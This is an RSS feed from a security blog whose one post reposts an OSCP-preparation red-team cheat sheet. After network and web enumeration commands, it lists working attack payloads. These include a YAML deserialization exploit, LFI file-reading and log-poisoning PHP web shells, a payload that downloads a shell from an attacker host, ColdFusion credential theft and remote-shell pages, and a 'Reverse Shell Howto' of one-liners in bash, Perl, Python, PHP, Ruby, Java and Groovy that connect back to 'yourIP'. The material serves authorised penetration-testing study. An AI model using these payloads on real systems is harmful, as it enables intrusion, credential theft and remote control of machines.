<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Or0kit • Posts by &#34;redteam&#34; tag</title>
        <link>https://Or0kit.github.io</link>
        <description>临渊羡鱼，不如退而结网</description>
        <language>zh-CN</language>
        <pubDate>Mon, 18 Jan 2021 15:58:06 +0800</pubDate>
        <lastBuildDate>Mon, 18 Jan 2021 15:58:06 +0800</lastBuildDate>
        <category>Algolia</category>
        <category>同义词替换</category>
        <category>Drozer</category>
        <category>xpath</category>
        <category>win32api</category>
        <category>WOW64</category>
        <category>windows消息机制</category>
        <category>虚拟内存</category>
        <category>jsDelivr</category>
        <category>First blog</category>
        <category>markdown 学习</category>
        <category>Android</category>
        <category>数论基础</category>
        <category>替换密钥</category>
        <category>ADB</category>
        <category>雷电模拟器</category>
        <category>Hadoop</category>
        <category>IDA</category>
        <category>Windows逆向</category>
        <category>SSH隧道</category>
        <category>url</category>
        <category>http</category>
        <category>Linux</category>
        <category>Nginx</category>
        <category>CentOS7配置vsftp</category>
        <category>Psad</category>
        <category>fwsnort</category>
        <category>应急响应</category>
        <category>x86汇编指令</category>
        <category>PE课后作业</category>
        <category>MFC</category>
        <category>PE查看器</category>
        <category>PE结构</category>
        <category>DOS头属性说明</category>
        <category>标准PE头属性说明</category>
        <category>扩展PE头属性说明</category>
        <category>节表属性说明</category>
        <category>空白区添加代码</category>
        <category>RVA与FOA</category>
        <category>合并节</category>
        <category>注入</category>
        <category>导入表注入</category>
        <category>导出表</category>
        <category>导入表</category>
        <category>扩大节</category>
        <category>新增节</category>
        <category>移动NT头</category>
        <category>移动导出表</category>
        <category>移动重定位表</category>
        <category>重定位表</category>
        <category>静态链接库</category>
        <category>动态链接库</category>
        <category>句柄</category>
        <category>逆向</category>
        <category>IDA学习</category>
        <category>静态分析基础</category>
        <category>动态分析技术基础</category>
        <category>恶意代码分析实战入门</category>
        <category>加壳</category>
        <category>脱壳</category>
        <category>C++壳</category>
        <category>ESP寻址</category>
        <category>定位Win32窗口回调函数</category>
        <category>HOOK攻防</category>
        <category>瞬时HOOK过检测</category>
        <category>INLINE-HOOK</category>
        <category>IAT HOOK</category>
        <category>INLINE HOOK</category>
        <category>进程监控</category>
        <category>模块隐藏</category>
        <category>进程通信</category>
        <category>tlhelp32.h</category>
        <category>进程遍历</category>
        <category>模块遍历</category>
        <category>外挂原理</category>
        <category>DLL注入之进程间通信</category>
        <category>TEB</category>
        <category>PEB</category>
        <category>R3层断链</category>
        <category>Win临界区</category>
        <category>Win事件</category>
        <category>线程同步</category>
        <category>Win互斥体</category>
        <category>内存映射文件</category>
        <category>内存映射共享</category>
        <category>写拷贝</category>
        <category>Win子窗口控件</category>
        <category>win32文件函数</category>
        <category>代码注入</category>
        <category>窗口程序</category>
        <category>消息机制</category>
        <category>消息类型</category>
        <category>私有内存</category>
        <category>共享内存</category>
        <category>设备对象</category>
        <category>DC设备上下文</category>
        <category>图形对象</category>
        <category>创建线程</category>
        <category>线程控制</category>
        <category>线程相关API</category>
        <category>线程上下文</category>
        <category>CONTEXT结构体</category>
        <category>物理内存</category>
        <category>Windows进程</category>
        <category>句柄表</category>
        <category>远程线程函数</category>
        <category>远程线程</category>
        <category>DLL注入</category>
        <category>DLL注入相关函数</category>
        <category>WinMain函数</category>
        <category>调用约定</category>
        <category>我的GetProcAddress</category>
        <category>资源文件</category>
        <category>消息断点</category>
        <category>通用控件</category>
        <category>WM_NOTIFY消息类型</category>
        <category>CobaltStrike</category>
        <category>Apeache</category>
        <category>Nmap</category>
        <category>php</category>
        <category>guestbook</category>
        <category>SQLmap</category>
        <category>apache</category>
        <category>log</category>
        <category>mysql主键</category>
        <category>CSRF</category>
        <category>SSRF</category>
        <category>业务逻辑漏洞</category>
        <category>xss</category>
        <category>webshell流量特征</category>
        <category>虚拟网卡</category>
        <category>RedTeam</category>
        <category>python</category>
        <category>SSH</category>
        <category>python文件读取</category>
        <category>数据分析</category>
        <category>socket</category>
        <category>数据库编程</category>
        <category>python内置属性</category>
        <category>scrapy</category>
        <category>测试</category>
        <category>BHP</category>
        <category>Python的import功能</category>
        <category>木马</category>
        <category>button</category>
        <category>multiprocessing</category>
        <category>threading</category>
        <category>单选框</category>
        <category>复选框件</category>
        <category>Edit</category>
        <category>Combo Box</category>
        <category>Tab</category>
        <category>ListCtrl</category>
        <category>MFC的本质</category>
        <category>MFC的层次结构图</category>
        <category>手动创建一个MFC程序</category>
        <category>MFC的初始化过程</category>
        <category>MFC运行时类型识别</category>
        <category>关键字static</category>
        <category>关键字const</category>
        <category>MFC动态创建</category>
        <category>MFC消息映射</category>
        <category>结构体AFX_MSGMAP_ENTRY</category>
        <category>结构体AFX_MSGM</category>
        <category>MFC的三大类消息</category>
        <category>数据传输</category>
        <category>ini文件的读写</category>
        <category>非可变序列算法</category>
        <category>可变序列算法</category>
        <category>排序算法</category>
        <category>迭代器</category>
        <category>使用自定义对象</category>
        <category>0环与3环的通信（常规方法）</category>
        <category>内核空间</category>
        <category>内核模块</category>
        <category>遍历内核模块</category>
        <category>定位未导出函数PspTiminateProcess</category>
        <category>内核编程基础</category>
        <category>ANSI_STRING</category>
        <category>UNICODE_STRING</category>
        <category>内核内存</category>
        <category>上下文环境</category>
        <category>中断请求级别</category>
        <category>链表</category>
        <category>自旋锁</category>
        <category>注册表</category>
        <category>地址空间</category>
        <category>文件操作</category>
        <category>线程与事件</category>
        <category>内核重载</category>
        <category>配置VS2019+WDK10</category>
        <category>第一个驱动程序</category>
        <category>驱动调试</category>
        <category>调试驱动程序</category>
        <category>OpenSCManager</category>
        <category>CreateService</category>
        <category>APC的本质</category>
        <category>APC的备用队列</category>
        <category>线性地址的管理</category>
        <category>VAD树</category>
        <category>_MMVAD</category>
        <category>_MMVAD_FLAGS</category>
        <category>VirtualAlloc</category>
        <category>MEM_COMMIT与MEM_RESERVE</category>
        <category>malloc</category>
        <category>堆内存</category>
        <category>栈内存</category>
        <category>全局区内存</category>
        <category>共享物理页</category>
        <category>共享文件</category>
        <category>LoadLibrary的本质</category>
        <category>MmAddPhysicalMemoryEx</category>
        <category>缺页异常</category>
        <category>消息队列</category>
        <category>PsConvertToGuiThread</category>
        <category>win32k.sys</category>
        <category>GUI线程</category>
        <category>窗口程序的创建</category>
        <category>消息循环</category>
        <category>临界区</category>
        <category>KPCR结构体</category>
        <category>模拟线程切换</category>
        <category>模拟挂起与恢复函数</category>
        <category>等待链表</category>
        <category>调度链表</category>
        <category>ETHREAD</category>
        <category>KTHREAD</category>
        <category>进程的创建</category>
        <category>获取当前进程</category>
        <category>EPROCESS</category>
        <category>KPROCESS</category>
        <category>2-9-9-12分页</category>
        <category>PAE</category>
        <category>PDPTE</category>
        <category>PDE</category>
        <category>PTE</category>
        <category>XD标志位</category>
        <category>逆向分析MmIsAddressValid函数(2-9-9-12)</category>
        <category>PWT</category>
        <category>PDT</category>
        <category>TLB</category>
        <category>CPU缓存</category>
        <category>INVLPG指令</category>
        <category>全局页</category>
        <category>ShadowWalker</category>
        <category>中断</category>
        <category>异常</category>
        <category>CLI指令</category>
        <category>STI指令</category>
        <category>INT2</category>
        <category>INT8</category>
        <category>中断门描述符</category>
        <category>IDT</category>
        <category>提权</category>
        <category>跨段跳转流程</category>
        <category>JMP FAR指令</category>
        <category>TSS</category>
        <category>任务门</category>
        <category>LDT段描述符</category>
        <category>LDT</category>
        <category>CR0</category>
        <category>CR2</category>
        <category>CR4</category>
        <category>段寄存器结构</category>
        <category>段描述符</category>
        <category>段选择子</category>
        <category>GDT表</category>
        <category>CRL</category>
        <category>DPL</category>
        <category>RPL</category>
        <category>调用门</category>
        <category>调用门描述符</category>
        <category>逆向分析MmIsAddressValid函数</category>
        <category>CALL与CALL FAR</category>
        <category>error C2143</category>
        <category>error C2275</category>
        <category>陷阱门描述符</category>
        <category>页目录表基址</category>
        <category>页表的基址</category>
        <category>0地址执行ShellCode</category>
        <category>10-10-12分页</category>
        <category>PDE_PTE</category>
        <category>物理页</category>
        <category>SSDT HOOK</category>
        <category>OpenProcess</category>
        <category>系统服务表</category>
        <category>SSDT</category>
        <category>SSDT HOOK隐藏</category>
        <category>API进出内核</category>
        <category>系统调用阶段总结</category>
        <category>网络安全法</category>
        <category>ASCII</category>
        <category>GBK</category>
        <category>ANSI</category>
        <category>Unicode</category>
        <category>UTF-8</category>
        <category>URL 编码/解码</category>
        <category>十进制</category>
        <category>二进制</category>
        <category>十六进制</category>
        <category>内存</category>
        <category>编写ShellCode实现IAT HOOK</category>
        <category>ShellCode原则</category>
        <category>加载图标</category>
        <category>提取图标</category>
        <category>资源表</category>
        <category>傀儡进程加密壳</category>
        <category>ZwUnmapViewOfSection函数</category>
        <category>HTML</category>
        <category>文件包含</category>
        <category>sql注入</category>
        <category>MFC命令传递</category>
        <category>远控界面编写</category>
        <category>STL</category>
        <category>Vector容器</category>
        <category>Deque容器</category>
        <category>List容器</category>
        <category>Set容器</category>
        <category>Multiset容器</category>
        <category>Map容器</category>
        <category>Multimap容器</category>
        <category>Stack容器</category>
        <category>Queue容器</category>
        <category>priority_queue容器</category>
        <category>经典定长指令</category>
        <category>经典变长指令</category>
        <category>指令前缀</category>
        <category>KAPC</category>
        <category>QueueUserAPC</category>
        <category>NtQueueApcThread</category>
        <category>KeInitializeApc</category>
        <category>KeInsertQueueApc</category>
        <category>KiInsertQueueApc</category>
        <category>进程句柄表</category>
        <category>全局句柄表</category>
        <category>消息队列与线程</category>
        <category>Windows线程切换</category>
        <category>KiSwapContext</category>
        <category>SwapContext</category>
        <category>时钟中断</category>
        <category>时间片管理</category>
        <category>线程切换与TSS</category>
        <category>线程切换与FS</category>
        <category>线程切换与线程优先级</category>
        <category>快速调用</category>
        <category>中断调用</category>
        <category>分析ReadProcessMemory</category>
        <category>KiFastSystemCall</category>
        <category>KiIntSystemCall</category>
        <category>重写3环</category>
        <category>文件上传</category>
        <category>隐藏驱动</category>
        <category>IopLoadDriver</category>
        <category>延迟过程调用</category>
        <category>进程挂靠</category>
        <category>跨进程读写内存</category>
        <category>APC</category>
        <category>逆向分析NtReadVirtualMemory</category>
        <category>逆向分析NtWriteVIrtualMemory</category>
        <category>payload</category>
        <category>AD-Attack-Defense</category>
        <category>sysenter指令</category>
        <category>KiFastCallEntry函数</category>
        <category>KiSystemService函数</category>
        <category>Trap_Frame</category>
        <category>web安全</category>
        <category>Pentest</category>
        <item>
            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/Reference/redteam-notebook/</guid>
            <title>redteam-notebook【转】</title>
            <link>https://or0kit.github.io/PenetrationTest/Reference/redteam-notebook/</link>
            <category>RedTeam</category>
            <pubDate>Mon, 18 Jan 2021 15:58:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;redteam-notebook&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redteam-notebook&#34;&gt;#&lt;/a&gt; redteam-notebook&lt;/h1&gt;
&lt;p&gt;Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.&lt;/p&gt;
&lt;h2 id=&#34;early-enumeration-generic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#early-enumeration-generic&#34;&gt;#&lt;/a&gt; Early Enumeration - generic&lt;/h2&gt;
&lt;h3 id=&#34;network-wide-scan-first-steps&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#network-wide-scan-first-steps&#34;&gt;#&lt;/a&gt; Network wide scan - first steps&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -sn 10.11.1.0/24&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;netbios-scan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netbios-scan&#34;&gt;#&lt;/a&gt; netbios scan&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nbtscan -r 10.11.1.0/24&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns-recon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-recon&#34;&gt;#&lt;/a&gt; DNS recon&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;dnsrecon -r 10.11.1.0/24 -n &amp;lt;DNS IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;scan-specific-target-with-nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scan-specific-target-with-nmap&#34;&gt;#&lt;/a&gt; Scan specific target with nmap&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -sV -sT -p- &amp;lt;target IP&amp;gt; &lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;guess-os-using-xprobe2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#guess-os-using-xprobe2&#34;&gt;#&lt;/a&gt; Guess OS using xprobe2&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;xprobe2 &amp;lt;target IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;check-netbios-vulns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#check-netbios-vulns&#34;&gt;#&lt;/a&gt; Check Netbios vulns&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;search-for-smb-vulns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#search-for-smb-vulns&#34;&gt;#&lt;/a&gt; Search for SMB vulns&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -p139,445 &amp;lt;target IP&amp;gt; --script smb-vuln*&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;enumerate-using-smb-null-session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumerate-using-smb-null-session&#34;&gt;#&lt;/a&gt; Enumerate using SMB (null session)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;enum4linux -a &amp;lt;target IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;enumerate-using-smb-wuser-pass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumerate-using-smb-wuser-pass&#34;&gt;#&lt;/a&gt; Enumerate using SMB (w/user &amp;amp; pass)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;enum4linux -a -u &amp;lt;user&amp;gt; -p &amp;lt;passwd&amp;gt; &amp;lt;targetIP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;website-enumeration&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#website-enumeration&#34;&gt;#&lt;/a&gt; Website Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;quick-enumeration-using-wordlist&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-enumeration-using-wordlist&#34;&gt;#&lt;/a&gt; quick enumeration using wordlist&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;gobuster -u http://&amp;lt;target IP&amp;gt; -w /usr/share/dirb/wordlists/big.txt&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;enumeration-and-basic-vuln-scan-of-a-website&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumeration-and-basic-vuln-scan-of-a-website&#34;&gt;#&lt;/a&gt; enumeration and basic vuln scan of a website&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nikto -host http://&amp;lt;target IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;website-tips-and-tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#website-tips-and-tricks&#34;&gt;#&lt;/a&gt; Website tips and tricks&lt;/h2&gt;
&lt;h3 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/apply:os.system [&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/yourIP/4444 0&amp;gt;&amp;amp;1&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Check for LFI&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Add  &lt;code&gt;/etc/passwd%00&lt;/code&gt;  to any GET/POST arguments. On windows try  &lt;code&gt;C:\Windows\System32\drivers\etc\hosts%00&lt;/code&gt;  or  &lt;code&gt;C:\autoexec.bat%00&lt;/code&gt; .&lt;br /&gt;
A quick win could also be any of these files  &lt;code&gt;c:\sysprep.inf&lt;/code&gt; ,  &lt;code&gt;c:\sysprep\sysprep.xml&lt;/code&gt;  or  &lt;code&gt;c:\unattend.xml&lt;/code&gt;  as they would contain local admin credentials. On linux it&#39;s worth checking  &lt;code&gt;/proc/self/environ&lt;/code&gt;  to see if there are any credentials passed to the running process via env vars.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fetching .php files via LFI&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;/index.php?somevar=php://filter/read=convert.base64-encode/resource=&amp;lt;file path&amp;gt;%00&lt;/code&gt;  this will return base64 encoded PHP file. Good for fishing up  &lt;code&gt;config.php&lt;/code&gt;  or similar.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Abusing /proc/self/environ LFI to gain reverse shell&lt;br /&gt;
In some situations it&#39;s possible to abuse  &lt;code&gt;/proc/self/environ&lt;/code&gt;  to execute a command. For example:&lt;br /&gt;
 &lt;code&gt;index.php?somevar=/proc/self/environ&amp;amp;cmd=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;&amp;lt;your IP&amp;gt;&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apache access.log + LFI = PHP injection&lt;br /&gt;
If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;with netcat send a request like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;auth.log + LFI&lt;br /&gt;
 &lt;code&gt;ssh &amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;@targetIP&lt;/code&gt;  and then LFI  &lt;code&gt;/var/log/auth.log&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;/var/mail + LFI&lt;br /&gt;
 &lt;code&gt;mail -s &amp;quot;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;&amp;quot; someuser@targetIP &amp;lt; /dev/null&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php expect&lt;br /&gt;
 &lt;code&gt;index.php?somevar=expect://ls&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php input&lt;br /&gt;
 &lt;code&gt;curl -X POST &amp;quot;targetIP/index.php?somevar=php://input&amp;quot; --data &#39;&amp;lt;?php system(&amp;quot;curl -o cmd.php yourIP/cmd.txt&amp;quot;);?&amp;gt;&#39;&lt;/code&gt; &lt;br /&gt;
Then access  &lt;code&gt;targetIP/cmd.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;coldfusion&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#coldfusion&#34;&gt;#&lt;/a&gt; ColdFusion&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;is it Enterprise or Community?&lt;br /&gt;
Check how it handles  &lt;code&gt;.jsp&lt;/code&gt;  files   &lt;code&gt;curl targetIP/blah/blah.jsp&lt;/code&gt; . If 404 - enterprise, 500 - community.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;which version?&lt;br /&gt;
 &lt;code&gt;/CFIDE/adminapi/base.cfc?wsdl&lt;/code&gt;  has a useful comment indicating exact version&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;common XEE&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHktYXNzZXNzbWVudC5jb20vZmlsZXMvYWR2aXNvcmllcy8yMDEwLTAyLTIyX011bHRpcGxlX0Fkb2JlX1Byb2R1Y3RzLVhNTF9FeHRlcm5hbF9FbnRpdHlfYW5kX1hNTF9JbmplY3Rpb24ucGRm&#34;&gt;https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LFI in admin login locale&lt;br /&gt;
 &lt;code&gt;/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\lib\password.properties&lt;/code&gt;  - may need full path. They can be obtained with help of   &lt;code&gt;/CFIDE/componentutils/cfexplorer.cfc&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Local upload and execution&lt;br /&gt;
Once access to admin panel is gained it&#39;s possible to use the task scheduler to download a file and use a system probe to execute it.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Debugging &amp;amp; Logging&lt;/code&gt;  -&amp;gt;  &lt;code&gt;Scheduled Tasks&lt;/code&gt;  -&amp;gt; url=&lt;path to our executable&gt;, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.&lt;/p&gt;
&lt;p&gt;To execute it create a probe  &lt;code&gt;Debugging &amp;amp; Logging&lt;/code&gt;  -&amp;gt;  &lt;code&gt;System probes&lt;/code&gt;  -&amp;gt; URL=&lt;some URL&gt;, Probe fail - fail if probe does not contain &amp;quot;blahblah&amp;quot;, Execute program &lt;path to our downloaded exe&gt;. And then run probe manually.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Files worth grabbing&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CF7 \lib\neo-query.xml&lt;/li&gt;
&lt;li&gt;CF8 \lib\neo-datasource.xml&lt;/li&gt;
&lt;li&gt;CF9 \lib\neo-datasource.xml&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Simple remote CFM shell&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;cfexecute name = &amp;quot;#URL.runme#&amp;quot; arguments =
&amp;quot;#URL.args#&amp;quot; timeout = &amp;quot;20&amp;quot;&amp;gt;
&amp;lt;/cfexecute&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Simple remote shell using Java (if CFEXECUTE is disabled)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;cfset runtime = createObject(&amp;quot;java&amp;quot;,
&amp;quot;java.lang.System&amp;quot;)&amp;gt;
&amp;lt;cfset props = runtime.getProperties()&amp;gt;
&amp;lt;cfdump var=&amp;quot;#props#&amp;quot;&amp;gt;
&amp;lt;cfset env = runtime.getenv()&amp;gt;
&amp;lt;cfdump var=&amp;quot;#env#&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dir-busting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dir-busting&#34;&gt;#&lt;/a&gt; dir busting&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;generic dirbusting&lt;br /&gt;
 &lt;code&gt;gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fuzz some cgi&lt;br /&gt;
 &lt;code&gt;gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;reverse-shell-howto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reverse-shell-howto&#34;&gt;#&lt;/a&gt; Reverse Shell Howto&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Bash&lt;br /&gt;
 &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/yourIP/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Perl Linux&lt;br /&gt;
 &lt;code&gt;perl -e &#39;use Socket;$i=&amp;quot;yourIP&amp;quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&amp;#125;;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Perl Windows&lt;br /&gt;
 &lt;code&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&amp;quot;yourIP:4444&amp;quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python&lt;br /&gt;
 &lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;yourIP&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PHP&lt;br /&gt;
 &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;yourIP&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ruby&lt;br /&gt;
 &lt;code&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;yourIP&amp;quot;,4444).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java (Linux)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;r = Runtime.getRuntime()
p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/yourIP/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Groovy&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;String host=&amp;quot;localhost&amp;quot;;
int port=8044;
String cmd=&amp;quot;cmd.exe&amp;quot;;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed())&amp;#123;while(pi.available()&amp;gt;0)so.write(pi.read());
while(pe.available()&amp;gt;0)so.write(pe.read());
while(si.available()&amp;gt;0)po.write(si.read());
so.flush();po.flush();
Thread.sleep(50);
try &amp;#123;p.exitValue();
break;
&amp;#125;catch (Exception e)&amp;#123;&amp;#125;&amp;#125;;
p.destroy();
s.close();

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;xterm&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;xterm -display yourIP:1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And on your side authorize the connection with  &lt;code&gt;xhost +targetIp&lt;/code&gt;  and catch it with  &lt;code&gt;Xnest :1&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;socat&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Listener:&lt;br /&gt;
 &lt;code&gt;socat file:`tty`,raw,echo=0 yourIP:4444&lt;/code&gt;&lt;/p&gt;
